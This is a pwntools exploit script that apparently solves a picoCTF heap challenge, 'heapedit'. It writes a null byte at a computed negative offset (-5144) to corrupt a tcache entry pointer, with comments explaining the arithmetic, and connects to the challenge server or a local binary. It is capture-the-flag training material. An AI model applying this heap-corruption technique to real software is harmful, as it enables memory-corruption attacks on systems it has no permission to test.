#!/usr/bin/python3
from pwn import *

# tcache https://www.youtube.com/watch?v=0jHtqqdVv1Y&list=PL-ymxv0nOtqoUdeKoKMxZBlfd9pD3mAah&index=3
# pwndgb https://pwndbg.re/CheatSheet.pdf
# first_new_mem_p address 0x6034a0
# tcache_perthread_cache_struct.entries[idx] list head address 0x602088
# 0x6034a0 - 0x602088 = 5144 => to change the tcache_entry next pointer
# we have to change the value at the tcache_entry address. It is 5144 bytes
# below our first_new_mem_p address => offset must be -5144
if args.REMOTE:
  p = remote("mercury.picoctf.net", "8054")
else:
  p = process("./heapedit_patched")

if args.DEBUG:
  gdb.attach(p)

p.sendlineafter("Address:", "-5144")
p.sendlineafter("Value:", b"\0")

p.interactive()
